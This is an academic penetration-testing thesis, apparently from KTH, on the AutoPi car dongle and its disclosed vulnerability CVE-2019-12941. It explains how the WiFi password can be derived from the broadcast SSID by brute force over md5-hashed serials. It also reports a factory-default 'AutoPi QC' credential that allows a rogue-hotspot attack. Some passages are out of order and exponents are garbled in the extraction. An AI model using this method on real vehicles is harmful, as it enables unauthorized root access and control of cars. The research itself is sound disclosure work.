=== Content from www.kth.se_68eee381_20250121_000746.html ===
IoT Penetration Testing: Security analysis of a car dongle

Aldin Burdzovic and Jonathan Matsson

Abstract— The ambition for Internet of Things (IoT) devices
of becoming a part of our everyday lives, is not only done
by entering our homes but also our vehicles. The demand
of attachable smart IoT products for cars is high. One such
product is the AutoPi, which connects the car to the internet and
allows for various features, usually found in high-end luxury
cars.

This paper presents an analysis of the cyber security aspects
of AutoPi. The ﬁndings presented shows that there is a critical
vulnerability in the system. The AutoPi can be exploited and full
access of the devices can be granted. The paper also discusses
what possible harm can be done through the found exploit.

Sammanfattning— Ambitionen f¨or Internet of Things (IoT)
apparater att bli en del av det vardagligalivet sker inte endast i
v˚ara hem, utan ¨aven i v˚ara fordon. Efterfr˚agan p˚a smarta IoT
produkter f¨or bilar ¨ar h¨og. En s˚adan produkt ¨ar AutoPi, vilket
ansluter bilen till Internet och m¨ojligg¨or f¨or diverse funktioner
vanligtvis funna i avancerade lyxbilar.

Denna uppsats presenterar en analys av cybers¨akerheten f¨or
AutoPi. Uppt¨ackterna som presenteras visar p˚a att det ﬁnns en
kritisk s¨akerhetsbrist i systemet och full ˚atkomst till apparaten
kan uppn˚as. Uppsatsen diskutera ¨aven m¨ojliga skador som kan
g¨oras genom den funna s˚arbarheten.

I. INTRODUCTION

The Internet of Things (IoT) is one of the hottest tech
terms today and is an increasingly debated topic as there
seems to be a boundless potential for improving everyday
lives. The idea of IoT is to attach embedded devices to
everyday objects to make them ”smart”. IoT is already taking
over the automotive industry were newer vehicles often
come standard equipped with internet connection and various
IoT technology such as autonomous driving [1]. Since the
automotive market to a large extent consist of second-hand
vehicles, the demand of attachable smart IoT products is
high. Many companies are now attempting to develop such
products [2].

The company AutoPi1 have developed a smart IoT dongle
for the car that enables various features to help and assist
the end-user. The AutoPi dongle supplies the user with
valuable information and diagnostics about the vehicle while
allowing various smart features, usually found in high-end
luxury vehicles. However, the amount of connected devices
that comes with the implementation of IoT technology and
especially having them so present in our daily lives, the
important topic of security arises. Manufacturers can often
overlook security in attempt of getting their product out on
the market as quick as possible. So how great is the security
risk of these devices and what harm can be done? This paper
presents an analysis of the cyber security aspects of AutoPi.

1https://www.autopi.io

We use threat modeling to plan and prioritize the work, as
well as ethical hacking (penetration testing) to analyze the
dongle security. As a result we found a vulnerability in Au-
toPi Wi-Fi/NB and 4G/LTE devices, that up until the writing
of this report on 2019-10-15 wasn’t ﬁxed. The company has
been informed and we have followed common responsible
disclosure protocols (90 days plus an additional 30 days after
discussions with the company). The vulnerability has been
assigned CVE-2019-12941.

II. BACKGROUND

This section introduces the reader to the topic and back-
ground information necessary for understanding the report.

A. ODB-II

On-Board-Diagnostics-II (ODB-II) is a standard which
regulates the look of the plug for the built-in car diagnostics
port. The ODB-II port allows for access to the vehicles vari-
ous sensors through communication with the car’s Electronic
Control Unit (ECU). The port is a way for external hardware
to communicate with the vehicle internal system, often used
by workshops for diagnostics and identifying errors. In 1994,
the ODB-II was standardized for all cars in the United States,
with Europe following in 2001 for all gasoline fueled cars
and in 2004 for all diesel cars [3]. Since then, ODB-II has
evolved into a much higher level of functionality allowing
more advanced diagnostics with a much greater detail. Today,
there is a growing market for devices that utilizes ODB-II in
order to provide various functionality to the end user2.

B. CAN

The Controller Area Network (CAN) is the standardized
internal network protocol in the automotive industry. CAN
is an asynchronous, multi-layer serial bus communication
protocol accessible via the cars OBD-II port. It is the ﬁrst
widely accepted automotive bus protocol and has been the
standard for internal network in passenger cars for over 30
years. CAN is a broadcast type of bus, meaning that all
messages that are sent on the network are available system-
wide. The nodes in the CAN network are in fact ECUs, each
controlling a certain set of functions within the vehicle. It
relies on several rules for which node gets to transmit over
the network and which listens. The CAN frame includes a
destination ﬁeld and data is multicasted on the bus where
nodes only address data which is addressed to them [5].
However, CAN was not designed to be secure from intrusion
[4], but rather to enable fast and stable communication. It

2https://www.marketwatch.com/press-release/global-obd-aftermarket-
industry-to-surpass-15bn-by-2024-global-market-insights-inc-2018-08-28

relies on that only the desired receivers are connected to the
network since there is no information about the source in
the frames, meaning that receiving nodes cannot now from
where the messages was sent and ultimately determine if it
is trustworthy or not.

C. Raspberry Pi

In 2012, the ﬁrst version of the Raspberry Pi was released
and has since become an attractive product with its small
size, relative good performance, low power consumption and
affordable price. The Raspberry Pi is a simple single-board
computer, which unlike a microcontroller, runs an operating
system and also has a much faster CPU. The result is a
credit-card sized computer capable of performing most of
the tasks of a regular computer. The platform also features
WiFi, Bluetooth, Ethernet, HDMI and USB ports. It runs
on an operating system named Raspbian which is a Debian-
based Linux distribution [10].

D. AutoPi

AutoPi provides a service to make your car a ”smart car”.
A dongle is inserted into the OBD-II port of the car which
gives the dongle access to the cars internal systems. AutoPi
also provides a cloud service that lets you communicate with
the dongle remotely over the Internet.

The dongle is built on a Raspberry PI Zero which makes
it a very powerful IoT-device. Hardware of the dongle that is
of interest in this paper are WiFi, Bluetooth, 4G, A-GPS, two
USB ports and a mini-HDMI port. The dongle runs a Web
server and a Secure Shell (SSH) server which are reachable
from the internal WiFi network.

The dongle also runs software developed by the AutoPi
team to simplify communication with the car and dongle. For
instance, the provided API lets the user run simple HTTPS
requests to record and replay commands on the CAN bus.
The software is open source under the Apache License and
can be found on github3.

The AutoPi is sold in several editions offering differ-
ent services. This paper will address the ”4G/LTE Edition
GEN2”-edition which is the fully equipped high end model.
Some results presented in this paper might be applicable to
other models as well.

E. Threat Modelling

Threat modeling is used to get a better understanding
of possible security threats to a system [12, p. 32]. The
process usually starts by producing a very general idea about
possible threats and stepwise produce more tangible and
detailed threats. A good threat model will not only help
ﬁnding threats, but also help prioritize threats according to
their severity and discoverability.

3https://github.com/autopi-io/autopi-core

F. Ethics

The paper is focused on testing security of an IoT device
intended for cars. This is done by hacking and ﬁnding
vulnerabilities in the device. This raises an ethical dilemma.
Is it morally okay to ﬁnd and publish vulnerabilities of
devices which can be used for something harmful, even if
the motive behind it is good?

To make tech products unhackable, they basically have to
be very simple with less functionality. However, tech prod-
ucts are getting more and more complex with advanced sys-
tems and greater functionality. This leaves much more room
for security ﬂaws in those products. These security ﬂaws can
be exploited by hackers. Normally, when people hear the
word hacker, they think of criminals. But there are ”ethical
hackers”, who for a living, exposes the vulnerabilities of
these products. The reasoning behind ethical hacking is that
it is better for someone ”good” to ﬁnd the vulnerabilities
before someone ”bad” ﬁnds them. Hence, it is better for
someone trusted to ﬁnd and report the vulnerabilities before
criminals exploit them.

When ﬁnding a vulnerability, it is important to disclose it
in a responsible way. This is done by notifying the developers
of the vulnerability and giving them time to patch it before
disclosing the vulnerability to the public. For the vulner-
abilities found in this paper, a 90 day disclosure deadline
was given to the developers. This method of responsible
disclosure is taken from the Google Project Zero4 to match
industry standards. A deadline also pushes the developers
to patch the system and improve their security in a timely
manner.

III. THREAT MODELING
The thread model is the foundation of which the security
testing is based upon. The threat modeling for the AutoPi
system documented in this paper follows the steps described
in the book ”IoT Penetration testing cookbook” [12, p. 42].

A. System Model

The premise of the AutoPi service is to let its end users
have full control over their dongles and modify them to ﬁt
their needs. This opens up for possible security holes as the
end users might not be particularly experienced with security.
Since the possibility of modiﬁcation is practically endless,
it is impossible to consider all possible security risks in
this paper. Therefore, the paper is focused on security of
dongles using the pre-installed hardware and software with
only slight modiﬁcations of the default settings.

Figure 1 is a simple overview of the system components
that pose a security risk. Every item in the ﬁgure is explained
in more details in the list underneath. Components that we
do not see as a possible security threat have been excluded
from our system model.

1) AutoPi: This is the main device. The dongle is built
on a Raspberry PI Zero with Raspbian as the pre-
installed operating system. This opens up for potential

4https://googleprojectzero.blogspot.com/2015/02/feedback-and-data-

driven-updates-to.html

access of the devices is given when connected through
WiFi.

6) GPS: The device comes with a GPS module for real-
time tracking of position, speed and altitude. It includes
Assisted-GPS (A-GPS) to improve startup performance.
7) 4G: Internet connection is provided through a built in
4G-module. A sim-card is required. This is a highly
secure network since 4G encrypts the trafﬁc between
the device and the base station [11].

8) Cloud Servers: There are two cloud servers providing
different services. One server communicates with end
users and one communicates with dongles. The com-
munication with end users will be sent over HTTPS
and the communication with dongles will be sent with
the SaltStack protocol.

9) Web Portal: The web portal, also known as the Au-
toPi Cloud software platform, allows for a dashboard
environment where the user remotely can monitor and
perform certain actions regarding the AutoPi. For in-
stance, the web portal displays data both from the car’s
internal computer and from external devices connected
to the AutoPi. The web portal also includes a terminal
for sending commands to be run on the AutoPi. The
terminal provided grants the user with root access.

B. Identifying Threats

The simpliﬁed threat model in Figure 1 gives an overview
of attack vectors. The threat model is then used to identify
explicit threats to help with documentation of threats. The
STRIDE method is used to get a general understanding of
possible threats. The most severe and discoverable threats
found via the STRIDE method are documented in greater
detail and ranked according to the DREAD method.

C. STRIDE

The STRIDE method is used to identify and categories
threats [12, p. 49] and is a commonly used in threat modeling
of vehicles [6]. STRIDE is an acronym for Spooﬁng of user
identity, Tampering, Repudiation, Information Disclosure,
Denial of Service and Elevation of Privilege.

These categories are used to help and ensure that all type
of threats are considered. The threats found with the method
can be seen in the list underneath:

Spooﬁng of user identity
– Claiming to be another user to get control over other

dongles.

– Pretending to be the cloud server and intercept trafﬁc
from users and dongles destined to the real cloud
server.

– Impersonating another dongle to retrieve unautho-

rized information from the cloud server.

Tampering
– Modifying data sent between client, dongle and

Fig. 1. Simpliﬁed threat model

attack surfaces since the Raspberry PI contains more
complexity compared to a simple embedded system.
While the car is turned off, the dongle will sleep for
cycles of 2 hours and wake up for 5 minutes between
sleep cycles. This is to prevent drainage of the car
battery.

2) Bluetooth: The AutoPi comes with Bluetooth 4.1 and
Bluetooth Low Energy (BLE). There are no default soft-
ware on the device which uses Bluetooth. It is mainly
for connecting third-party products through, combined
with self-written code on the device,
to accomplish
some wanted feature.

3) Physical connections: The devices comes with physical
ports that can be used to for implementing additional
functionality to the dongle. The dongle has two USB
2.0 ports, one mini-HDMI port and 18 GPIO pins.
4) OBD: The device is connected to the OBD-II port of the
car. The OBD-II port provides the dongle with power
and is also used for communication between dongle and
car. Some examples of functions that this port can be
used for are remotely starting the car5 or unlocking the
car6.

5) WiFi: The device can act both as a WiFi hotspot and a
WiFi client. When connected to 4G, the device can be a
WiFi hotspot so that other may connect to the network
to gain internet connection. Also, the device itself can
connect
to a WiFi network to establish an internet
connection without depending on 4G connection. When
connected to the AutoPi dongles WiFi network, one
have access to the local web portal of the devices. The
web portal allows for various network conﬁguration,
also including a terminal
to run commands on the
device.
When connected to the WiFi, it is also possible to
SSH into the device. Both the web portal terminal and
the SSH terminal grants root access, meaning that full

5https://www.autopi.io/use-cases/remote-start/
6https://www.autopi.io/use-cases/auto-lock-unlock/

server.
Repudiation

Information Disclosure
– Intercept data sent between client, dongle and server.
– Capture data sent on the vehicles CAN bus.
– Set up a monitoring access point.
Denial of Service
– Bring down the dongles WiFi to prevent communi-

cation between client and dongle.

– Bring down the dongles 4G connection to prevent

communication between dongle and server.

Elevation of Privilege
– Bypass WiFi authorization and connect to the device

with root access.

– Brute force web portal password to access dongle

web platform which gives root access.

The four threats that we saw as most severe and discover-
able was documented in greater detail. These threats can be
seen in Tables I through IV.

TABLE I
THREAT 1

Threat description

Threat target
Attack techniques
Countermeasures

Intercepting and modifying trafﬁc sent between
dongle and server
Network interface between dongle and server
Man-in-the-middle between dongle and server
Authorize the dongle and server to each other

TABLE IV
THREAT 4

Threat description
Threat target
Attack techniques
Countermeasures

Vulnerable services running on the dongle
AutoPi dongle
Scanning ports
Keep services up-to-date and implement good
ﬁrewall rules

potential, Reproducibility, Exploitability, Affected users and
Discoverability.

Every threat were given a score between 1 through 3 for
every category (1 being the lowest value and 3 the highest).
The score of all categories were summed to give a total score.
The threats can then be prioritized according to their total
score. The DREAD ranking can be seen in Table V.

TABLE V
DREAD RANKING

Threat 1
2
2
1
3
1
9

Threat 2
3
1
2
1
2
9

Threat 3
3
1
3
1
2
10

Threat 4
2
2
3
3
2
12

D
R
E
A
D
Total

TABLE II
THREAT 2

Threat description

Threat target
Attack techniques

Countermeasures

Attacker bypasses the WiFi authorization and
connects to the dongles WiFi network
AutoPi dongle
The attacker brute forces a large variety of
common/random passwords to authenticate to
the network
Use complex password

TABLE III
THREAT 3

Threat description

Threat target
Attack techniques

Countermeasures

Claiming to be another user to get control over
dongles that the perpetrator should not have
access to
Web server and access tokens
Phishing or bruteforce to obtain login creden-
tials. Modiﬁcation of access tokens.
Preventing large numbers of login attempts in a
short amount of time and reduces login veriﬁca-
tion speed. Thorough checks on access tokens

D. DREAD

IV. THEORY

With consideration to the threat model from previous
chapter, it is evident that the greatest attack vectors are
communication involving the cloud server and the WiFi
network since three out of the four threats are applicable
to those component. The WiFi is remotely accessible from
outside of the car and a host connected to the WiFi network
will have root access to the device. The same applies to the
cloud server. This paper is therefore primarily focused on
threats regarding those two components.

A. Dongle services

Services running on the dongle that are of interest to this
paper is services that are remotely reachable. This includes
services that are listening on a speciﬁc port that is reachable
through the ﬁrewall of the dongle or services that in some
way communicate with hosts outside the dongle. The Iptable
rules of the dongle7 speciﬁes the open ports on which the
dongle listens (these services are only reachable from the
dongles local WiFi network). They can be seen in Table VI.
the only services
reachable from hosts outside the dongles own local WiFi are
services that initiates the connection towards outside hosts.
Some of the applications running on the dongle might have
known vulnerabilities that can be used to exploit the dongle.

Because of the strict ﬁrewall rules,

The threats were ranked according to the DREAD
method[12, p. 33]. DREAD is an acronym for Damage

7https://github.com/autopi-io/autopi-core/blob/master/src/salt/base

/state/network/wlan/hotspot/iptables-ipv4.rules

TABLE VI
OPEN PORTS AND CORRESPONDING SERVICES

Service
SSH
DNS
DHCP
HTTP
HTTP (API)

Port
22 (TCP)
53 (TCP & UDP)
67 (UDP)
80 (TCP)
9000 (TCP)

A common way of ﬁnding vulnerabilities for applications are
with the use of the Common Vulnerabilities and Exposures
(CVE) list8 which contains publicly known vulnerabilities.
The services that are reachable remotely within WiFi range
are: the WiFi hotspot (hostapd version 2.4), the WiFi client
(wpa supplicant version 2.4) and the WiFi DHCP client
(dhcpcd version 6.11.5). Services that communicate over the
Internet are SaltStack (version 2017.7.5) and HTTPS request
are sent via the python library requests (version 2.12.4).
There are no severe vulnerabilities reported of these services
applicable to the dongle.

B. Wiﬁ hotspot

The WiFi hotspot is conﬁgured to use WPA2 encryption
with a 12 hexadecimal number as password. The password
is obtained from the ﬁrst 12 characters of the dongle id and
the SSID is the 12 last characters of the dongle id prepended
with ”AutoPi-”. The dongle id is the same as the minion id
which is used by the dongle to identify itself to the salt-
master. The process of producing the minion id can be seen
on row 9 in the minion install ﬁle9:

- name: "grep Serial /proc/cpuinfo | awk ’{print
$3}’ | md5sum | awk ’{print $1}’ | tee
/etc/salt/minion_id | cut -c21- | sed
’s/ˆ/autopi-/g’ > /etc/hostname"

The minion id is a Message Digest 5 (md5) hash of the
Raspberry Pi’s serial number found in /proc/cpuinfo. Md5
is a hash function which purpose is to create signatures
of large ﬁles and is therefore designed to be a fast hash
function [9]. It is not intended to encrypt the given input. The
serial number is a random string between ”00000000” and
”FFFFFFFF” with 8 zeros padded in front. 8 hex characters
gives a total of 168 possible combinations. This means that
there are 168 possible outputs from the md5 hash function
with a serial number as input. So even though the md5 hash
is 32 hex characters long, there are only a small subset (168)
of those combinations used. One can also see that the last
12 characters of the md5 hash (preﬁxed with ”AutoPi-”) is
used as the hostname of the dongle.

C. Wiﬁ client

The WiFi client is continuously trying to connect to known
WiFi networks. If it is connected to a WiFi AP, the WiFi

8https://cve.mitre.org/
9https://github.com/autopi-io/autopi-core/blob/master/src/salt/base/state

/minion/install.sls

connection will be preferred over the 4G network. This
means that the dongle will send all outgoing trafﬁc over the
WiFi connection, including its DNS request.

D. Cloud servers

The cloud service can be divided into three distinct parts:

The website, the RESTful API and the salt-master.

1) Website: The website uses django auth for authentica-
tion10. Anyone is free to create an account. A dongle
is linked to a speciﬁc account by entering the dongles
dongle id. An account can be linked to multiple dongles.
As default, a dongle is only allowed to be linked with
one account, but that limit can be increased by the
AutoPi staff manually if requested. Most of the websites
functionality uses the RESTful API as backend.

2) RESTful API: The API service runs over HTTPS and
provides a simple way to communicate with the cloud
service. Authentication is done using the Authorization
header of the HTTPS request. There are two types of
tokens that can be used to authorize an API call: a
”bearer”-token or a ”token”-token.
The ”bearer”-token is obtained by providing a valid
username and password. The returned token has the
JSON Web Token (JWT) format11. The JWT token is
base64 encoded and separated into three parts: Header,
payload and signature.
The headers (in AutoPi’s implementation of the JWT)
speciﬁes the algorithm used for the signature and that
this is in fact a JWT token. The algorithm used is
HMAC-SHA256 [7] which is highly secure unless a
very simple key is provided during encryption.
The payload contains the username, user id and e-mail
of the user that this token is valid for. It also contains
the date at which this token becomes invalid. This is set
to eight hours.
The signature is, as state previously, created with the
HMAC-SHA256 algorithm which takes the headers and
payload as input combined with a secret key. This
provides integrity as a modiﬁcation of the headers or
payload will invalidate the signature.
The ”token”-token is a static value that is used by
the dongle to communicate with the cloud server au-
tonomously without any user interaction. It can only be
used to upload event data and retrieve custom modules
from the cloud.

3) Salt-Master: AutoPi uses SaltStack to simplify the
infrastructure and communication between their cloud
server and the dongles. SaltStack uses a publish and
subscribe pattern. The dongles (also known as salt-
minions) subscribe to topics and the server (also known
as the salt-master) publishes data on those topics. Salt-
stack’s implementation of the pattern ensures that it is
the salt-master that initiates all communication.
The authentication between salt-master and salt-minion
are done using a minion id (which is the same as

10https://docs.djangoproject.com/en/2.2/topics/auth/
11https://jwt.io/introduction/

the dongle id) and RSA keys. The ﬁrst time the salt-
minion connects to the salt-master, the salt-master saves
the RSA public key received from the salt-minion and
links it to the corresponding minion id. The salt-minion
saves the RSA public key received from the salt-master.
This procedure is done before the product is sent to
the customer and ensures that the salt-master and the
salt-minion have a way to authenticate each other. All
subsequent trafﬁc sent between the two is encrypted
using Advanced Encryption Standard (AES).

V. METHOD

This chapter introduces the methodology used throughout

the work.

A. WiFi hotspot

As all trafﬁc on the WiFi network is securely encrypted,
there are not much information gained from snifﬁng the
trafﬁc from a host outside the network. The only information
that can be gathered are the MAC-addresses of computers
on the network and the SSID used by the access point.
This leaves two possible entry points: gaining access by
manipulating the back end hostapd application during the
WPA2 handshake or gaining access by sending the correct
password.

The fastest way to brute force a WiFi network is to
catch the 4-way handshake used in the WPA2 protocol
to authenticate a client with the AP12. These packets can
then be used to brute force the password locally. Since
the password is a 12 character hex string, there are 1612
possible combinations. Using hashcat13 on a GPU doing ˜180
kHashes/sec would go through all possible 12 hex character
passwords (1612) in:

A program was written in java to exploit this vulnerability.
The program took the 12 hex characters of the SSID as input
and returned all possible dongle ids. This program went
through multiple iterations to optimize the run time. The
program was later branched out into two programs using
different methods: one using GPU supported brute forcing
and one precomputing a wordlist containing all possible
dongle ids sorted by their last 12 characters (the part found
in the SSID) that can be search through by e.g. a binary
search algorithm.

As the ﬁrst method requires a powerful GPU and the other
method requires a lot of disk drive space, both programs were
run on a desktop computer. The programs listened on a TCP
port for the input SSID and returned the correct hash over
the TCP connection which allows a perpetrator to perform
the hack remotely within the WiFi range of the car.

B. WiFi client

When connected to the AutoPi through its WiFi hotspot,
one can access the local web portal of the device through
local.autopi.io. This portal is, among others, used for network
conﬁguration and is where the user would conﬁgure the 4G
or the WiFi connection. However, the WiFi already comes
preconﬁgured with one network. There is a preconﬁgured
WiFi network with SSID ”AutoPi QC” and password ”au-
topi2019”, which we assume is for the manufacturer’s quality
control, hence the ”QC”. To exploit this, a hotspot was set
up with these credentials. The AutoPi is conﬁgured so that it
prioritizes known WiFi networks over a 4G connection. Since
the AutoPi is constantly scanning for known WiFi networks,
the connection to the fake WiFi hotspot was established in
less than a minute and all trafﬁc is directed to the WiFi
network instead of via the 4G connection.

1612
180000

≈ 50 years

C. Cloud servers

With the knowledge that there are only 168 possible dongle
id’s (from which the WiFi password is taken), one can brute
force the passwords in 168 tries:

168
180000

≈ 6.6 hours

The SSID of the network contains the 12 last characters
of the dongle id. The SSID is broadcasted to everyone in the
vicinity of the car. This information can be used to deduce
the whole dongle id which contains the WiFi password.

All dongle ids with the last 12 characters equal to the 12
characters of the SSIDs is candidates for being the correct
dongle id. This method does not require the attacker to
catch a WPA2 handshake which means that it can be used
without the need for an external user to be connected to the
network. This method is also a lot faster since the md5 hash
is designed to do fast hashing of large ﬁles [9] while the
PBKDF2 used in WPA2 is deliberately slow to reduce the
effectiveness of brute force attacks [8].

12https://www.aircrack-ng.org/doku.php?id=cracking wpa
13https://hashcat.net/wiki/

To exploit the found WiFi client vulnerability further, a
DNS spooﬁng attack was done. The goal behind doing a
DNS spooﬁng attack is to make the AutoPi believe it is
communicating with the AutoPi cloud server, when in fact
it is communicating with our ”fake” server. Whenever the
AutoPi send a DNS request, the response will be the IP
address of our fake server, since the AutoPi is connected
to our controlled network. As the AutoPi receives the IP
address, it will set up a TCP connection to the fake server.
AutoPi uses SaltStack for communication between server and
dongles. It also send speciﬁc event data over HTTPS.

Since the tests in this paper is done directly on the live
cloud servers, care have been taken to not disturb the service.
Only test that have no way of reading, editing or in some
way affect other users data or service have been performed.
Authentication tokens have been modiﬁed in different
ways to try and gain unauthorized access to send commands
to the dongle via the cloud API.

VI. RESULTS

This chapter describes the ﬁndings of the work.

A. WiFi hotspot

The two vulnerabilities found compliments each other
which makes the WiFi hotspot, using the default SSID
and password, exploitable. The ﬁrst vulnerability is that the
dongle ids are derived from a input with a 8 hex character
variance. This reduces the possible subset of dongle ids from
1632 to 168 and possible passwords from 1612 to 168. The
other vulnerability is that the last 12 characters of the dongle
id is broadcasted as the SSID. This, in combination with
the ﬁrst vulnerability, allows for a faster brute force attack
without the need to catch a WPA handshake.

Since the method used to derive the password from the
SSID is done by taking 12 characters of the hash and
trying to ﬁnd the whole 32 character hash, the method could
return multiple candidates since multiple hashes might have
the same 12 last characters. The probability of a evenly
distributed 32 hex character hash having the same last 12
characters is:

1620
1632 =

1
1612

This probability is the same as the probability of at least
two dongles having the same SSID. Since it is such a small
number, it is negligible.

As stated before in the method paragraph, the end re-
sult where two programs utilizing different methods: one
using GPU supported brute forcing and one precomputing
a wordlist containing all possible dongle ids sorted by their
last 12 characters (the part found in the SSID) that could
searched through with a binary search algorithm. The code
can be found in the Appendix of this document.

The GPU program is written in java with CUDA14. Run-
ning the program on a GeForce GTX 1060 going through all
168 possible combinations took <1 second.

The wordlist created with the second method contained
168 hashes with every hash being 16 bytes (128 bits). This
gave a ﬁle size of:

168 · 16 ≈ 69 GB

Using a binary search algorithm on the sorted list with

168 hashes gives a maximum time complexity of:

log2 168 = 32

B. WiFi client

We are not quite sure if the preconﬁgured WiFi interface
is just a random error or a production ﬂaw. But we know for
certain that the two AutoPi dongles which we have access
to, came preconﬁgured with the ”AutoPi QC” WiFi network
and with the same ”autopi2019” password. Therefore, it is
possible to set up a WiFi hotspot using this information and
the AutoPi dongle will in a short time connect to that hotspot,
without the owner being aware of it. The one in control of
the hotspot can then perform several attacks such as trafﬁc
snifﬁng or DNS spooﬁng.

14https://developer.nvidia.com/cuda-zone

The dongle includes its hostname in the DHCP discovery
broadcasted to the DHCP server. The dongles hostname
contains the last 12 characters of the dongle id.

The Iptable rules for the WiFi client interface only allows
related connections, forwarding and output15. This means
that we were able to reach hosts on the dongles internal
trafﬁc directed
network via the forwarding rule, but all
directly towards the dongle is dropped under the input rule.
We were therefore only able to reach the dongle directly
when it sets up outgoing connections.

C. Cloud servers

By performing a DNS spooﬁng attack, the AutoPi dongle
can be tricked into believing it
is communicating with
the AutoPi Salt-Master server. As the dongle receives the
response of the DNS request with the fake IP address, it will
try to set up a TCP connection with that server. However, the
AutoPi dongle and server uses RSA keys for authentication
during the SaltStack handshake. The dongle sets up the TCP
connection and sends its public RSA key which then gets
to the fake server. It also identiﬁes itself with its minion
id, which is the same as the dongle id, and contains the
SSID and WiFi password. When the fake server responds
with its public key, the connection is shut down since the
AutoPi dongle notices that it is not matching the real AutoPi
Salt-Master key. Hence, the DNS spooﬁng attack was not
successful. Any man-in-the-middle attack is futile.

The dongle does also send event data over HTTPS to the
server. Since HTTPS needs a valid certiﬁcation, in this case
for the domain ”autopi.io”, the dongle will not send any data
to the fake server. The HTTPS sent from the dongle uses the
”token”-token in the authorization header. This is the weaker
authentication with very limited use. So even if one is able to
fake a valid certiﬁcate, the HTTPS data and the intercepted
token would not be to any great use.

VII. DISCUSSION

Depending on what add-ons is combined with the dongle,
AutoPi presents a load of features. It is truly a product that
brings a great upgrade to the car. But is it secure?
The premise of the AutoPi service is to let

its end
user have full control over their product. To accommodate
this, restrictions have to be relaxed to allow custom code
and modiﬁcations. This leads greater damage potential for
found vulnerabilities and it is therefore important to have
a very secure “outer layer”. AutoPi achieves this by using
external libraries and software that have proven themselves
to be secure. Everything sent from the dongle and cloud
servers are encrypted ensuring conﬁdentiality, integrity and
authentication.

The found vulnerabilities stems from human conﬁguration
errors rather than vulnerable software. The vulnerability
found regarding the WiFi credentials can be exploited on
any AutoPi dongle using the default WiFi settings. There
is no way of knowing exactly how many dongles that are

15https://github.com/autopi-io/autopi-core/blob/master/src/salt/base/state

/wlan/hotspot/iptables-ipv4.rules (interface wlan0)

Available: https://www.ericsson.com/assets/local/mobility-report/docu
ments/2016/emr-november-2016-digital-transformation.pdf

[3] European Parliament, ”DIRECTIVE 98/69/EC OF THE EUROPEAN
PARLIAMENT AND OF THE COUNCIL of 13 October 1998 relating
to measures to be taken against air pollution by emissions from motor
vehicles and amending”, page 21, paragraph 8.2, Oct 1998.
Available: https://eur-lex.europa.eu/LexUriServ/LexUriServ.do?uri=C
ONSLEG:1998L0069:19981228:EN:PDF

[4] R. Currie, ”Hacking the CAN Bus: Basic Manipulation of a Modern
Automobile Through CAN Bus Reverse Engineering”, SANS Institute
Information Security Reading Room, page 2. paragraph 1, May 2017.
Available: https://www.sans.org/reading-room/whitepapers/threats/pap
er/37825

[5] International Organization for Standardization, ”Road vehicles – Con-
troller area network (CAN)”, ISO 11898-1, page 5, paragraph 6.1, Dec
2013.
Available: http://read.pudn.com/downloads209/ebook/986064/ISO%20
11898/ISO%2011898-1.pdf

[6] W. Xiong, F. Krantz, and R. Lagerstr¨om, “Threat modeling and attack
simulations of connected vehicles: a research outlook,” in the Proc.
of the 5th International Conference on Information Systems Security
and Privacy (ICISSP), page 2, paragraph 2.4, Feb 2019.

[7] D. Eastlake and T. Hansen, ”US Secure Hash Algorithms (SHA and
HMAC-SHA)”, Internet Request for Comments, vol. RFC 4634, page
14, paragraph 7, Jul 2006.
Available: https://tools.ietf.org/html/rfc4634

[8] B. Kaliski, ”PKCS #5: Password-Based Cryptography Speciﬁcation
Version 2.0”, Internet Request for Comments, vol. RFC 2898, page 8,
paragraph 5.2, Sep 2000.
Available: https://www.ietf.org/rfc/rfc2898.txt

[9] R. Rivest, ”The MD5 Message-Digest Algorithm”, Internet Request
for Comments, vol. RFC 1321, page 0, paragraph 1, Apr 1992.
Available: https://www.ietf.org/rfc/rfc1321.txt

[10] Raspbian, ”Raspbian FAQ”, paragraph ”What

is Raspbian?”, Apr

2019.
Available: https://www.raspbian.org/RaspbianFAQ#What is Raspbian.
3F

[11] J. Cichoniski and J. Franklin, ”LTE Security – How Good Is It?”, RSA

Conference 2015, slide 34, Apr 2015.
Available: https://www.rsaconference.com/writable/presentations/
ﬁle upload/tech-r03 lte-security-how-good-is-it.pdf

[12] A. Guzman and A. Gupta, ”IoT Penetration Testing Cookbook”, Packt

Publishing Ltd., Nov 2017.

vulnerable to the exploit. Since the default password seems
to be a 12 hex character long random generated string, it
might give people the illusion of being secure and it would
thus reduce the amount of people changing the password.

Because of the previously mentioned balance between
availability and security, the found exploit gives a perpetrator
full root access to the dongle.

The AutoPi is marketed as product with various features.
Depending on the vehicle combined with the AutoPi, the
execution of certain operations can be achieved. One such
operation is to record and replay commands sent on the
vehicles CAN bus. All communication to the ECUs goes
through the CAN bus. On certain car models, commands
such as unlocking the vehicle and starting the engine runs
on the CAN bus. Hence, the manufacturer has provided a
feature that lets the one in control of the AutoPi unlock and
start the car.

There is a substantial amount of actions that can be
performed by controlling an AutoPi unit connected to a car.
But the most severe is the controlling of the CAN bus. By
being able to send commands on the CAN bus, the actions
of the vehicle can be manipulated. Hence, raising a serious
amount of safety and security issues.

VIII. FUTURE WORKS

Since this paper has been done independently of AutoPi,
there are a lot more to test regarding the cloud service. Great
care have been taken to not affect the service of the cloud
servers which constrains the amount of test that can be done
and how thorough those tests can be.

The tests in this paper have been performed on a device
with default settings and no extra add-ons. The premise of
the AutoPi dongle is to allow implementation of custom code
and adding extra hardware. This is something that could be
looked into further. Examples are the Bluetooth module and
the USB ports. Since they are not used with default software
and hardware, there have been no security testing of them in
this paper.

IX. CONCLUSIONS

This paper shows that a product might have vulnerabilities
even though the development of the product have been
heavily security focused. A simple oversight regarding the
generation of the SSID and password of the device led to a
security exploit in an otherwise very secure device.

ACKNOWLEDGEMENT

We would like to thank our supervisors Robert Lagerstr¨om
and Pontus Johnson for their support and guidance through-
out the entire work.

REFERENCES

[1] A. Meola ”Automotive Industry Trends: IoT Connected Smart Cars &

Vehicles”, Business Insider, Dec 2016.
Available: https://www.businessinsider.com/internet-of-things-connect
ed-smart-cars-2016-10?r=US&IR=T

[2] Ericsson, ”Digital transformation and the connected car”, Ericsson

Mobility Report, Nov 2016.



=== Content from www.diva-portal.org_889b7ba3_20250121_000737.html ===
EXAMENSARBETE
GRUNDNIVÅ, 15 HP
STOCKHOLM SVERIGE2019
,

INOM

DATATEKNIK,

IoT Penetration Testing:
Security analysis of a car
dongle

ALDIN BURDZOVIC

JONATHAN MATSSON

KTH
SKOLAN FÖR ELEKTROTEKNIK OCH DATAVETENSKAP

IoT Penetration Testing: Security analysis of a car dongle

Aldin Burdzovic and Jonathan Matsson

Abstract— The ambition for Internet of Things (IoT) devices
of becoming a part of our everyday lives, is not only done
